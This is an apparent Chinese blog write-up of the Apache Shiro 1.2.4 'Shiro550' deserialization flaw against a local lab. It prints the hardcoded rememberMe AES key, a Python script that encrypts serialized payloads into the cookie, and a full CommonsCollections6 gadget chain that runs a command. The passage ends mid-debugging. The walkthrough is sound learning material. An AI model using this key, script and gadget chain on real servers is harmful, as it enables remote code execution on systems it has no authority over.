@@ -1,0 +1,309 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Shiro反序列化 | clown</title><meta name="author" content="clown"><meta name="copyright" content="clown"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="Shiro介绍直接问kimi给出的大致介绍 Apache Shiro是一个强大且易于使用的Java安全框架，提供了认证、授权、加密和会话管理等功能。它被设计为易于理解且易于使用，同时提供了强大的安全性。以下是Shiro的一些关键特性：  认证（Authentication）：Shiro提供了多种认证方式，包括用户名和密码、OAuth、LDAP等。 授权（Authorization）：Shiro允许">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Shiro反序列化">
+<meta property="og:url" content="https://clowsman.github.io/2024/06/11/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/index.html">
+<meta property="og:site_name" content="clown">
+<meta property="og:description" content="Shiro介绍直接问kimi给出的大致介绍 Apache Shiro是一个强大且易于使用的Java安全框架，提供了认证、授权、加密和会话管理等功能。它被设计为易于理解且易于使用，同时提供了强大的安全性。以下是Shiro的一些关键特性：  认证（Authentication）：Shiro提供了多种认证方式，包括用户名和密码、OAuth、LDAP等。 授权（Authorization）：Shiro允许">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/clowsman/image@main/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20240329155057.jpg">
+<meta property="article:published_time" content="2024-06-11T12:17:23.000Z">
+<meta property="article:modified_time" content="2024-06-15T02:55:55.967Z">
+<meta property="article:author" content="clown">
+<meta property="article:tag" content="java反序列化">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/clowsman/image@main/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20240329155057.jpg"><link rel="shortcut icon" href="https://cdn.jsdelivr.net/gh/clowsman/image@main/8591fe993ff61c3b8ac9be3d6c12e7f.jpg"><link rel="canonical" href="https://clowsman.github.io/2024/06/11/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: true,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Shiro反序列化',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2024-06-15 10:55:55'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><meta name="generator" content="Hexo 7.0.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/8591fe993ff61c3b8ac9be3d6c12e7f.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">49</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">26</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">24</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group hide" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 清单</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li><li><a class="site-page child" href="/Gallery/"><i class="fa-fw fas fa-images"></i><span> 照片</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://cdn.jsdelivr.net/gh/clowsman/image@main/微信图片_20240329155057.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="clown"><img class="site-icon" src="https://cdn.jsdelivr.net/gh/clowsman/image@main/8591fe993ff61c3b8ac9be3d6c12e7f.jpg"/><span class="site-name">clown</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group hide" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 清单</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li><li><a class="site-page child" href="/Gallery/"><i class="fa-fw fas fa-images"></i><span> 照片</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Shiro反序列化</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-06-11T12:17:23.000Z" title="发表于 2024-06-11 20:17:23">2024-06-11</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-06-15T02:55:55.967Z" title="更新于 2024-06-15 10:55:55">2024-06-15</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/java%E6%BC%8F%E6%B4%9E/">java漏洞</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="Shiro反序列化"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="Shiro介绍"><a href="#Shiro介绍" class="headerlink" title="Shiro介绍"></a>Shiro介绍</h1><p>直接问kimi给出的大致介绍</p>
+<p>Apache Shiro是一个强大且易于使用的Java安全框架，提供了认证、授权、加密和会话管理等功能。它被设计为易于理解且易于使用，同时提供了强大的安全性。以下是Shiro的一些关键特性：</p>
+<ol>
+<li><strong>认证（Authentication）</strong>：Shiro提供了多种认证方式，包括用户名和密码、OAuth、LDAP等。</li>
+<li><strong>授权（Authorization）</strong>：Shiro允许你定义权限和角色，并根据这些定义来控制用户对资源的访问。</li>
+<li><strong>加密（Cryptography）</strong>：Shiro提供了一套加密工具，可以用于安全地存储和传输数据。</li>
+<li><strong>会话管理（Session Management）</strong>：Shiro可以管理Web和非Web环境中的会话。</li>
+<li><strong>Web支持</strong>：Shiro提供了对Web应用的内置支持，可以轻松集成到Servlet、JSP等Web技术中。</li>
+<li><strong>缓存（Caching）</strong>：Shiro内置了缓存机制，可以提高认证和授权过程的性能。</li>
+<li><strong>企业级安全</strong>：Shiro的设计考虑了企业级应用的需求，提供了灵活的安全策略和集成点。</li>
+<li><strong>易于集成</strong>：Shiro可以轻松集成到现有的Java应用中，无论是大型企业应用还是小型项目。</li>
+<li><strong>可扩展性</strong>：Shiro的架构允许开发者根据需要扩展其功能，例如自定义认证和授权策略。</li>
+<li><strong>社区支持</strong>：作为Apache软件基金会的一部分，Shiro拥有活跃的社区和持续的更新。</li>
+</ol>
+<h1 id="Shrio环境搭建"><a href="#Shrio环境搭建" class="headerlink" title="Shrio环境搭建"></a>Shrio环境搭建</h1><p>可以直接从github上面将代码clone到本地：<a target="_blank" rel="noopener" href="https://github.com/apache/shiro">https://github.com/apache/shiro</a></p>
+<p>然后切换回1.2.4的版本，该版本就是shiro550的漏洞</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> git@github.com:apache/shiro.git<br>git checkout shiro-root-1.2.4<br></code></pre></td></tr></table></figure>
+
+<p>编辑shiro&#x2F;samples&#x2F;web目录下的pom.xml,将jstl的版本修改为1.2。</p>
+<p><img src="https://gitee.com/ljc0033/magic/raw/master/image-20240611233305207.png" alt="image-20240611233305207"></p>
+<p>然后配置Tomcat服务器将环境跑起来即可，记得添加一个<strong>samples_web_war</strong>工件</p>
+<p><img src="https://gitee.com/ljc0033/magic/raw/master/image-20240611233723956.png" alt="image-20240611233723956"></p>
+<p><img src="https://gitee.com/ljc0033/magic/raw/master/image-20240611233734929.png" alt="image-20240611233734929"></p>
+<p>环境搭建和漏洞分析都可以参考这篇文章：<a target="_blank" rel="noopener" href="https://changxia3.com/2020/09/03/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0%E4%B8%80%EF%BC%88%E5%8E%9F%E7%90%86%E7%AF%87%EF%BC%89/">Shiro反序列化漏洞笔记一（原理篇） (changxia3.com)</a></p>
+<p>怪了过两天这环境突然就出错了</p>
+<p>emmm这里可能需要配置一下<strong>tomcat&#x2F;conf&#x2F;server.xml</strong>文件，不然会报错</p>
+<p><img src="https://gitee.com/ljc0033/magic/raw/master/image-20240613235256764.png" alt="image-20240613235256764"></p>
+<p>参考这篇文章<a target="_blank" rel="noopener" href="https://blog.csdn.net/seeeeeeeeeee/article/details/124724396">https://blog.csdn.net/seeeeeeeeeee/article/details/124724396</a></p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">Connector</span> <span class="hljs-attr">port</span>=<span class="hljs-string">&quot;8088&quot;</span> <span class="hljs-attr">protocol</span>=<span class="hljs-string">&quot;HTTP/1.1&quot;</span></span><br><span class="hljs-tag">               <span class="hljs-attr">URIEncoding</span>=<span class="hljs-string">&quot;UTF-8&quot;</span></span><br><span class="hljs-tag">               <span class="hljs-attr">connectionTimeout</span>=<span class="hljs-string">&quot;20000&quot;</span></span><br><span class="hljs-tag">               <span class="hljs-attr">redirectPort</span>=<span class="hljs-string">&quot;8443&quot;</span></span><br><span class="hljs-tag">               <span class="hljs-attr">maxParameterCount</span>=<span class="hljs-string">&quot;1000&quot;</span></span><br><span class="hljs-tag">               <span class="hljs-attr">relaxedPathChars</span>=<span class="hljs-string">&quot;|&#123;&#125;[],_%&quot;</span></span><br><span class="hljs-tag">               <span class="hljs-attr">relaxedQueryChars</span>=<span class="hljs-string">&quot;|&#123;&#125;[],_%&quot;</span></span><br><span class="hljs-tag">               /&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>说是新版tomcat请求不允许一些特殊字符，这里就放行一些特殊字符，但改了之后谷歌还是不行，edge改成http就可以了</p>
+<p>后来找了半天找一个方法终于能解决了：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_69576997/article/details/136731424">https://blog.csdn.net/qq_69576997/article/details/136731424</a></p>
+<p>谷歌浏览器url输入：chrome:&#x2F;&#x2F;net-internals&#x2F;#hsts</p>
+<p>edge浏览器url输入：edge:&#x2F;&#x2F;net-internals&#x2F;#hsts</p>
+<p>然后在最后一行的<strong>Delete domain security policies</strong>中输入localhost，点击delete，然后重启tomcat就可以了</p>
+<p><img src="https://gitee.com/ljc0033/magic/raw/master/image-20240614132940906.png" alt="image-20240614132940906"></p>
+<p>麻了这些环境配置。。。</p>
+<h1 id="Shiro550漏洞"><a href="#Shiro550漏洞" class="headerlink" title="Shiro550漏洞"></a>Shiro550漏洞</h1><p>Shiro550的漏洞是因为其存在固定key加密的原因</p>
+<h2 id="寻找固定key"><a href="#寻找固定key" class="headerlink" title="寻找固定key"></a>寻找固定key</h2><p>我们这里从源码入手找到其固定key</p>
+<p>Shiro在登陆是勾选了rememberMe选项就会设置一个rememberMe的cookie</p>
+<p><img src="https://gitee.com/ljc0033/magic/raw/master/image-20240611234659707.png" alt="image-20240611234659707"></p>
+<p><img src="https://gitee.com/ljc0033/magic/raw/master/image-20240611234718498.png" alt="image-20240611234718498"></p>
+<p>且解码的流程就是<strong>base64解码&#x3D;》AES解密&#x3D;》反序列化</strong></p>
+<p>我们可以直接去源码搜索对应的函数，可以全局搜索一下Cookie关键字</p>
+<p>可以找到一个CookieRememberMeManger函数，这名字就很明显了</p>
+<p><img src="https://gitee.com/ljc0033/magic/raw/master/image-20240612000131474.png" alt="image-20240612000131474"></p>
+<p>然后里面有对cookie处理的很多函数，我们可以找到一个序列化和反序列化之类相关的方法，这里先找一个反序列化相关的函数，然后往上寻找调用链，找到他的固定key</p>
+<p><img src="https://gitee.com/ljc0033/magic/raw/master/image-20240613221027529.png" alt="image-20240613221027529"></p>
+<p>这里就是获取序列化内容反序列化，然后base64解码，返回的对应AES加密的内容</p>
+<p>往上找调用方法</p>
+<p><img src="https://gitee.com/ljc0033/magic/raw/master/image-20240613221343146.png" alt="image-20240613221343146"></p>
+<p>这里进行了convert转换了一下，这里函数再往上找已经是一些校验相关的功能了，那就是这个函数已经完成了解密，跟进去函数看看</p>
+<p><img src="https://gitee.com/ljc0033/magic/raw/master/image-20240613221819479.png" alt="image-20240613221819479"></p>
+<p>果然，里面进行了解密，然后再进行反序列化之后返回</p>
+<p>从其中的函数功能最终跟踪下去可以在<strong>AbstractRememberMeManager</strong>这个类的构造方法找到固定key的赋值</p>
+<p><img src="https://gitee.com/ljc0033/magic/raw/master/image-20240612001639914.png" alt="image-20240612001639914"></p>
+<p><img src="https://gitee.com/ljc0033/magic/raw/master/image-20240612001655002.png" alt="image-20240612001655002"></p>
+<p>可以知道其密钥是固定字符串的base64解码得到</p>
+<p>知道了固定密钥之后构造对应的rememberMe字符串就很简单了，AES加密的脚本可以网上找一下</p>
+<h2 id="打cc链"><a href="#打cc链" class="headerlink" title="打cc链"></a>打cc链</h2><p>一般shiro都会有cc的包</p>
+<p><img src="https://gitee.com/ljc0033/magic/raw/master/image-20240612001947670.png" alt="image-20240612001947670"></p>
+<p>但是不一定可以打，我们可以用插件分析一下依赖关系</p>
+<p><img src="https://gitee.com/ljc0033/magic/raw/master/image-20240612002101256.png" alt="image-20240612002101256"></p>
+<p>被标了test的运行时都不会被编译，所以一般线上的时候都是打不通的，不过这里的原因是没有代码去使用这个依赖，没有import它。</p>
+<p><strong>这里原生shiro没有自带cc依赖</strong></p>
+<p>这里加一个3.2.1的版本</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.2.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p><strong>AES加密的脚本</strong></p>
+<p>网上找的一个脚本：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/12702?time__1311=mqmhDvox8FGNDQtiQGkI50Qc30Ki=sF54D&alichlgref=https://www.google.com/#toc-1">https://xz.aliyun.com/t/12702?time__1311=mqmhDvox8FGNDQtiQGkI50Qc30Ki%3DsF54D&amp;alichlgref=https%3A%2F%2Fwww.google.com%2F#toc-1</a></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> uuid<br><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> Random<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_file_data</span>(<span class="hljs-params">filename</span>):<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(filename,<span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        data = f.read()<br>    <span class="hljs-keyword">return</span> data<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">aes_enc</span>(<span class="hljs-params">data</span>):<br>    BS = AES.block_size<br>    pad = <span class="hljs-keyword">lambda</span> s:s +((BS - <span class="hljs-built_in">len</span>(s) % BS) * <span class="hljs-built_in">chr</span>(BS - <span class="hljs-built_in">len</span>(s) % BS)).encode()<br>    key = <span class="hljs-string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span><br>    mode = AES.MODE_CBC<br>    iv = uuid.uuid4().<span class="hljs-built_in">bytes</span><br>    encryptor = AES.new(base64.b64decode(key),mode,iv)<br>    ciphertext = base64.b64encode(iv + encryptor.encrypt(pad(data)))<br>    <span class="hljs-keyword">return</span> ciphertext<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">aes_dec</span>(<span class="hljs-params">enc_data</span>):<br>    enc_data = base64.b64encode(enc_data)<br>    unpad = <span class="hljs-keyword">lambda</span> s : s[:-s[-<span class="hljs-number">1</span>]]<br>    key = <span class="hljs-string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span><br>    mode = AES.MODE_CBC<br>    iv = enc_data[:<span class="hljs-number">16</span>]<br>    encryptor = AES.new(base64.b64decode(key),mode,iv)<br>    plaintext = encryptor.decrypt(enc_data[<span class="hljs-number">16</span>:])<br>    plaintext = unpad(plaintext)<br>    <span class="hljs-keyword">return</span> plaintext<br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    data = get_file_data(<span class="hljs-string">&quot;ser.bin&quot;</span>)<br>    <span class="hljs-built_in">print</span>(aes_enc(data))<br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>这个Crypto库有点坑，第一次用，记录一下</p>
+<p>先安装下面这个库</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">pip3 install pycryptodome<br></code></pre></td></tr></table></figure>
+
+<p>然后需要去c:\users\86189\appdata\local\programs\python\python37\lib\site-packages路径下将一个crypto的文件夹的c改成大写的C即可</p>
+</blockquote>
+<p><strong>固定密钥</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">kPH+bIxk5D2deZiIxcaaaA==<br></code></pre></td></tr></table></figure>
+
+<p>我们可以先打一个cc6的链子试一试</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">cc6_demo1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span><span class="hljs-keyword">throws</span> Exception&#123;<br>        Transformer[] transformers=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        Map&lt;Object,Object&gt; map=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(map, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>));<span class="hljs-comment">//这里先随便赋一个值后面改回来</span><br><br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap, <span class="hljs-string">&quot;aaa&quot;</span>);<span class="hljs-comment">//这里待会调用的时候会在mpa新增加一个键值对aaa</span><br>        Map&lt;Object,Object&gt; hashMap=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        hashMap.put(tiedMapEntry,<span class="hljs-string">&quot;aaa&quot;</span>);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">lazyMapClass</span> <span class="hljs-operator">=</span> LazyMap.class;<br>        Field trans=lazyMapClass.getDeclaredField(<span class="hljs-string">&quot;factory&quot;</span>);<br>        trans.setAccessible(<span class="hljs-literal">true</span>);<br>        trans.set(lazyMap,chainedTransformer);<span class="hljs-comment">//这里改回来chainedTransformer</span><br>        map.remove(<span class="hljs-string">&quot;aaa&quot;</span>);<span class="hljs-comment">//移除掉我们新增的键值</span><br><br>        serialize(hashMap);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span><span class="hljs-keyword">throws</span> Exception&#123;<br>        ObjectOutputStream oos=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span><span class="hljs-keyword">throws</span> Exception&#123;<br>        ObjectInputStream ois=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        Object obj=ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>        &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>然后将生成的ser.bin文件进行aes加密后再base64进行传参</p>
+<blockquote>
+<p>这里我一开始试了一下用cyberchef来加密发现不行，还是得用上面的脚本</p>
+</blockquote>
+<p>先看一下正常的：</p>
+<p><img src="https://gitee.com/ljc0033/magic/raw/master/image-20240614215924819.png" alt="image-20240614215924819"></p>
+<p>打了cc6的：</p>
+<p><img src="https://gitee.com/ljc0033/magic/raw/master/image-20240614220816682.png" alt="image-20240614220816682"></p>
+<p>这里就是没登录上去是正常的，后端开启debug去看一下，这时候应该是有报错的</p>
